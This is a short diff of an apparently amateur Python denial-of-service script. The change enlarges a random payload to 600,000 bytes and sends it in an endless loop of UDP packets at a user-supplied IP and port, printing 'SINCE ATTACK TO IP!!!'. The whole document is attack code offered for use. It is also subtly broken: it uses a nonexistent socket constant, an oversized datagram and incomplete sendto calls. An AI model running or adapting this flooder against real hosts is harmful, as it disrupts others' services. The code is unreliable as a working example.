@@ -13,14 +13,14 @@ threads_since = int(input("Thread Dari since : "))
 os.system("clear")
 
 def since():
-    devxyz = random._urandom(1800)
+    pushy = random._urandom(600000)
     while True:
         try:
             s = socket.socket(socket.AF_INET , socket.SOCK_GRAM)
             s.connect((ip_since,port_since))
-            s.sendto(devxyz)
+            s.sendto(pushy)
             for x in range(paket_since):
-                s.sendto(devxyz)
+                s.sendto(pushy)
             print("[-] SINCE ATTACK TO IP!!!")
         except:
             print("[/] SINCE ATTACK TO IP!!!")
